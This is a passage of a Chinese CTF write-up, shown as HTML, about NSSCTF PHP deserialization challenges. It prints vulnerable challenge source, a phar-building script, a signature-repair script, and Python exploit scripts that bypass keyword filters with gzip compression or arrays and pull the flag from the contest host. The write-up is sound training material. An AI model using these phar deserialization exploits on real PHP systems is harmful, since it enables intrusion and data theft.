class=\"string\">&quot;FLAG&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$config</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;w&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;./tmp/a.txt&quot;</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;r&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$_GET</span>[<span class=\"number\">0</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"number\">0</span>]);</span><br><span class=\"line\"><span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">&quot;那么就从这里开始起航吧&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"代码审计\"><a href=\"#代码审计\" class=\"headerlink\" title=\"代码审计\"></a>代码审计</h4><h5 id=\"第一部份\"><a href=\"#第一部份\" class=\"headerlink\" title=\"第一部份\"></a>第一部份</h5><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">A</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$config</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;w&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"title function_ invoke__\">file_put_contents</span>(<span class=\"string\">&quot;./tmp/a.txt&quot;</span>, <span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;config == <span class=\"string\">&#x27;r&#x27;</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$data</span> = <span class=\"variable\">$_POST</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/get|flag|post|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class=\"variable\">$data</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">&quot;我知道你想干吗，我的建议是不要那样做。&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$data</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一段可以看见当</p>\n<p>config&#x3D;w时是写入.&#x2F;tmp&#x2F;a.txt内容</p>\n<p>config&#x3D;r时是读取文件内容</p>\n<h5 id=\"第二部分-3\"><a href=\"#第二部分-3\" class=\"headerlink\" title=\"第二部分\"></a>第二部分</h5><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">throw</span> <span class=\"title\">new</span> <span class=\"title\">Error</span>(<span class=\"params\"><span class=\"string\">&quot;那么就从这里开始起航吧&quot;</span></span>)</span>;</span><br></pre></td></tr></table></figure>\n\n<p>__destruct和throw new Error的关系</p>\n<p>需要通过<strong>CG垃圾回收来绕过</strong></p>\n<h5 id=\"第三部分-2\"><a href=\"#第三部分-2\" class=\"headerlink\" title=\"第三部分\"></a>第三部分</h5><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getflag</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">getenv</span>(<span class=\"string\">&quot;FLAG&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以通过这个<strong>getflag类来获取FLAG</strong></p>\n<p>代码审计整理思路得出</p>\n<p>先生成getflag类的phar文件，将phar文件中的序列化字符串进行修改绕过异常抛出</p>\n<p>但是，每一个<strong>phar文件都有相应的签名</strong>，<strong>直接修改会导制文件失效</strong>，所以还需要根据修改后的文件来<strong>修复签名</strong></p>\n<h4 id=\"生产phar文件-ph1-phar\"><a href=\"#生产phar文件-ph1-phar\" class=\"headerlink\" title=\"生产phar文件 ph1.phar\"></a>生产phar文件 ph1.phar</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">getflag</span></span>&#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">getflag</span>();</span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">array</span>(<span class=\"number\">0</span>=&gt;<span class=\"variable\">$a</span>,<span class=\"number\">1</span>=&gt;<span class=\"literal\">null</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;ph1.phar&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">addFromString</span>(<span class=\"string\">&quot;test.txt&quot;</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$phar</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改ph1-phar文件中的序列化字符串绕过异常抛出\"><a href=\"#修改ph1-phar文件中的序列化字符串绕过异常抛出\" class=\"headerlink\" title=\"修改ph1.phar文件中的序列化字符串绕过异常抛出\"></a>修改ph1.phar文件中的序列化字符串绕过异常抛出</h4><p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241028185615601.png\" alt=\"image-20241028185615601\"></p>\n<p>将倒数第二个1改为零</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20241028185540520.png\" alt=\"image-20241028185540520\"></p>\n<h4 id=\"修复签名\"><a href=\"#修复签名\" class=\"headerlink\" title=\"修复签名\"></a>修复签名</h4><p>生成可用文件ph2.phar</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> hashlib <span class=\"keyword\">import</span> sha256</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ph1.phar&quot;</span>, <span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    text = f.read()</span><br><span class=\"line\">    main = text[:-<span class=\"number\">40</span>]  <span class=\"comment\"># 正文部分(除去最后40字节)</span></span><br><span class=\"line\">    end = text[-<span class=\"number\">8</span>:]  <span class=\"comment\"># 最后八位也是不变的</span></span><br><span class=\"line\">    new_sign = sha256(main).digest()</span><br><span class=\"line\">    new_phar = main + new_sign + end</span><br><span class=\"line\">    <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ph2.phar&quot;</span>, <span class=\"string\">&#x27;wb&#x27;</span>).write(new_phar)  <span class=\"comment\"># 将新生成的内容以二进制方式覆盖写入原来的phar文件</span></span><br></pre></td></tr></table></figure>\n\n<p>一个phar文件经过压缩之后，再用phar协议读取打开，也是可以正常执行的</p>\n<ol>\n<li>普通phar</li>\n<li>gzip</li>\n<li>bzip2</li>\n<li>tar</li>\n<li>zip</li>\n</ol>\n<p>一共就5种可以触发phar操作</p>\n<p>上述任意一种方式来进行写入和读取</p>\n<h4 id=\"压缩绕过\"><a href=\"#压缩绕过\" class=\"headerlink\" title=\"压缩绕过\"></a>压缩绕过</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> gzip</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">&#x27;http://node4.anna.nssctf.cn:28723/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">file = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;./ph2.phar&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>)  <span class=\"comment\"># 打开文件</span></span><br><span class=\"line\">file_out = gzip.<span class=\"built_in\">open</span>(<span class=\"string\">&quot;./phar.zip&quot;</span>, <span class=\"string\">&quot;wb+&quot;</span>)  <span class=\"comment\"># 创建压缩文件对象</span></span><br><span class=\"line\">file_out.writelines(file)</span><br><span class=\"line\">file_out.close()</span><br><span class=\"line\">file.close()</span><br><span class=\"line\"></span><br><span class=\"line\">requests.post(</span><br><span class=\"line\">    url,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./phar.zip&#x27;</span>, <span class=\"string\">&#x27;rb&#x27;</span>).read()</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)  <span class=\"comment\"># 写入</span></span><br><span class=\"line\"></span><br><span class=\"line\">res = requests.post(</span><br><span class=\"line\">    url,</span><br><span class=\"line\">    params=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span></span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    data=&#123;</span><br><span class=\"line\">        <span class=\"number\">0</span>: <span class=\"string\">&#x27;phar://tmp/a.txt&#x27;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">)  <span class=\"comment\"># 触发</span></span><br><span class=\"line\">res.encoding = <span class=\"string\">&#x27;utf-8&#x27;</span></span><br><span class=\"line\">flag = re.<span class=\"built_in\">compile</span>(<span class=\"string\">&#x27;(NSSCTF\\&#123;.+?\\&#125;)&#x27;</span>).findall(res.text)[<span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"数组绕过\"><a href=\"#数组绕过\" class=\"headerlink\" title=\"数组绕过\"></a>数组绕过</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">url=<span class=\"string\">&quot;http://node4.anna.nssctf.cn:28853/&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 写入phar文件</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;ph2.phar&quot;</span>,<span class=\"string\">&#x27;rb&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    data1=&#123;<span class=\"string\">&#x27;0[]&#x27;</span>:f.read()&#125;          <span class=\"comment\">#传数组绕过，值就是hacker1.phar文件的内容</span></span><br><span class=\"line\">    param1 = &#123;<span class=\"number\">0</span>: <span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;w&quot;;&#125;&#x27;</span>&#125;</span><br><span class=\"line\">    res1 = requests.post(url=url, params=param1,data=data1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">### 读phar文件，获取flag</span></span><br><span class=\"line\">param2=&#123;<span class=\"number\">0</span>:<span class=\"string\">&#x27;O:1:&quot;A&quot;:1:&#123;s:6:&quot;config&quot;;s:1:&quot;r&quot;;&#125;&#x27;</span>&#125;</span><br><span class=\"line\">data2=&#123;<span class=\"number\">0</span>:<span class=\"string\">&quot;phar://tmp/a.txt&quot;</span>&#125;</span><br><span class=\"line\">res2=requests.post(url=url,params=param2,data=data2)</span><br><span class=\"line\">flag=re.<span class=\"built_in\">compile</span>(<span class=\"string\">&#x27;NSSCTF\\&#123;.*?\\&#125;&#x27;</span>).findall(res2.text)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"prize-p5\"><a href=\"#prize-p5\" class=\"headerlink\" title=\"prize_p5\"></a>prize_p5</h3><h3 id=\"题干\"><a href=\"#题干\" class=\"headerlink\" title=\"题干\"></a>题干</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">catalogue</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$class</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$data</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span> = &quot;<span class=\"title\">error</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">        $<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span> = &quot;<span class=\"title\">hacker</span>&quot;;</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">    <span class=\"title\">public</span> <span class=\"title\">function</span> <span class=\"title\">__destruct</span>()</span></span><br><span class=\"line\"><span class=\"class\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"keyword\">new</span> <span class=\"variable language_\">$this</span>-&gt;<span class=\"class\"><span class=\"keyword\">class</span>($<span class=\"title\">this</span>-&gt;<span class=\"title\">data</span>);</span></span><br><span class=\"line\"><span class=\"class\">    &#125;</span></span><br><span class=\"line\"><span class=\"class\">&#125;</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"title\">class</span> <span class=\"title\">error</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"><span class=\"variable\">$OTL</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;OTL = <span class=\"variable\">$OTL</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> (<span class=\"string\">&quot;hello &quot;</span>.<span class=\"variable language_\">$this</span>-&gt;OTL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">escape</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span> = <span class=\"string\">&#x27;OTL&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$phone</span> = <span class=\"string\">&#x27;123666&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$email</span> = <span class=\"string\">&#x27;sweet@OTL.com&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">abscond</span>(<span class=\"params\"><span class=\"variable\">$string</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;NSS&#x27;</span>, <span class=\"string\">&#x27;CTF&#x27;</span>, <span class=\"string\">&#x27;OTL_QAQ&#x27;</span>, <span class=\"string\">&#x27;hello&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$filter</span> = <span class=\"string\">&#x27;/&#x27;</span> . <span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;|&#x27;</span>, <span class=\"variable\">$filter</span>) . <span class=\"string\">&#x27;/i&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">preg_replace</span>(<span class=\"variable\">$filter</span>, <span class=\"string\">&#x27;hacker&#x27;</span>, <span class=\"variable\">$string</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/object/i&#x27;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cata&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$cc</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">catalogue</span>();</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$cc</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;name&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;phone&#x27;</span>])&amp;&amp;<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>]))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&quot;/flag/i&quot;</span>,<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;nonono,you can not do that!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">escape</span>();</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span>-&gt;name = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span>-&gt;phone = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;phone&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span>-&gt;email = <span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;email&#x27;</span>];</span><br><span class=\"line\">        <span class=\"variable\">$abscond</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$abscond</span>);</span><br><span class=\"line\">        <span class=\"variable\">$escape</span> = <span class=\"title function_ invoke__\">get_object_vars</span>(<span class=\"title function_ invoke__\">unserialize</span>(<span class=\"title function_ invoke__\">abscond</span>(<span class=\"variable\">$abscond</span>)));</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$escape</span>[<span class=\"string\">&#x27;phone&#x27;</span>]))&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$escape</span>[<span class=\"string\">&#x27;email&#x27;</span>]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;I&#x27;m sorry to tell you that you are wrong&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"解法一-1\"><a href=\"#解法一-1\" class=\"headerlink\" title=\"解法一\"></a>解法一</h3><h4 id=\"序列化字符串逃逸\"><a href=\"#序列化字符串逃逸\" 